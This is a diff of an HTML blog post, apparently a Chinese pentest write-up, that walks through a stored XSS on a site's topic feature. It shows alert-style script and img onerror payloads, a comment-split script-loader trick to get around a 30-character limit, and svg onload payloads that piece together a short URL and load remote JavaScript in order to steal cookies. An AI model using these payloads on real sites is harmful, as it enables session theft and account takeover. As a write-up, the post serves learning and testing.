@@ -82,87 +82,60 @@
     [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/xss">xss</a>)
 </div>
 
-      <div>
-
-<p>首先感谢凯神的指导</p>
-
+      <div><p>首先感谢凯神的指导</p>
 <h3 id="0x00-注册账号">0x00 注册账号</h3>
-
 <p>先得到一个临时邮箱，然后注册账号
-<img src="/img/post/xss_example_get_temporary_email.png" alt="65" /></p>
-
-<p><img src="/img/post/xss_example_register.png" alt="35" /></p>
-
+<img src="/img/post/xss_example_get_temporary_email.png" alt="65"></p>
+<p><img src="/img/post/xss_example_register.png" alt="35"></p>
 <h3 id="0x01-找输入输出点">0x01 找输入输出点</h3>
-
-<p><img src="/img/post/xss_example_add_topic.png" alt="40" /></p>
-
-<p><img src="/img/post/xss_example_input_output_point.png" alt="80" /></p>
-
+<p><img src="/img/post/xss_example_add_topic.png" alt="40"></p>
+<p><img src="/img/post/xss_example_input_output_point.png" alt="80"></p>
 <h3 id="0x02-尝试构造payload">0x02 尝试构造payload</h3>
-
 <p>payload用如下的即可：</p>
-
-<pre><code>&lt;script&gt;alert(1)&lt;/script&gt;
-&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a
-</code></pre>
-
-<p>但是这个要在点击删除时payload才起作用
-<img src="/img/post/xss_example_payload_test.png" alt="40" /></p>
-
-<pre><code>也可用&lt;img src=1 onerror=alert(1) /&gt;自动加载，但也要点击删除按钮才能起作用  
+<pre tabindex="0"><code>&lt;script&gt;alert(1)&lt;/script&gt;
+&#34;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a
+</code></pre><p>但是这个要在点击删除时payload才起作用
+<img src="/img/post/xss_example_payload_test.png" alt="40"></p>
+<pre tabindex="0"><code>也可用&lt;img src=1 onerror=alert(1) /&gt;自动加载，但也要点击删除按钮才能起作用  
 但是我们若想充分利用则需要远程加载自己的js
-</code></pre>
-
-<h3 id="0x03-加载自己的js">0x03 加载自己的js</h3>
-
+</code></pre><h3 id="0x03-加载自己的js">0x03 加载自己的js</h3>
 <ul>
 <li>此时的限制条件为：</li>
 </ul>
-
-<pre><code>* 30个字符
+<pre tabindex="0"><code>* 30个字符
 * script标签不能自己触发
-</code></pre>
-
-<ul>
+</code></pre><ul>
 <li>只能构造类似下面的语句自己加载脚本：</li>
 </ul>
-
-<pre><code>a=document.createElement('script');
-a.src=&quot;www.xxx.com&quot;;
+<pre tabindex="0"><code>a=document.createElement(&#39;script&#39;);
+a.src=&#34;www.xxx.com&#34;;
 document.head.appendChild(a);
-</code></pre>
-
-<ul>
+</code></pre><ul>
 <li>可以用如下方法分割，多次添加：</li>
 </ul>
-
-<pre><code>a=document.createE/*
-*/lement('script');/*
-*/a.src=&quot;www.xxx.com&quot;;/*
+<pre tabindex="0"><code>a=document.createE/*
+*/lement(&#39;script&#39;);/*
+*/a.src=&#34;www.xxx.com&#34;;/*
 */document.head.app/*
 */endChild(a);
 
 但此处不可行，考虑直接用JQuery等的函数getScript(URL)直接加载url，然而此处依然不行
-</code></pre>
-
-<ul>
-<li><p>查找
-<img src="/img/post/xss_example_find_loadjs.png" alt="50" /></p></li>
-
-<li><p>构造payload
-<img src="/img/post/xss_example_short_url.png" alt="45" /></p></li>
+</code></pre><ul>
+<li>
+<p>查找
+<img src="/img/post/xss_example_find_loadjs.png" alt="50"></p>
+</li>
+<li>
+<p>构造payload
+<img src="/img/post/xss_example_short_url.png" alt="45"></p>
+</li>
 </ul>
-
-<pre><code>使用如下payload：
-&lt;svg/onload=&quot;b='http://t.i'&quot;&gt;
-&lt;svg/onload=&quot;b+='m/16ap6'&quot;&gt;
-&lt;svg/onload=&quot;$loadJs(b)&quot;&gt;
-</code></pre>
-
-<h3 id="0x04-得到cookie">0x04 得到Cookie</h3>
-
-<p><img src="/img/post/xss_example_get_cookie.png" alt="70" /></p>
+<pre tabindex="0"><code>使用如下payload：
+&lt;svg/onload=&#34;b=&#39;http://t.i&#39;&#34;&gt;
+&lt;svg/onload=&#34;b+=&#39;m/16ap6&#39;&#34;&gt;
+&lt;svg/onload=&#34;$loadJs(b)&#34;&gt;
+</code></pre><h3 id="0x04-得到cookie">0x04 得到Cookie</h3>
+<p><img src="/img/post/xss_example_get_cookie.png" alt="70"></p>
 </div>
     </article>
   </main>
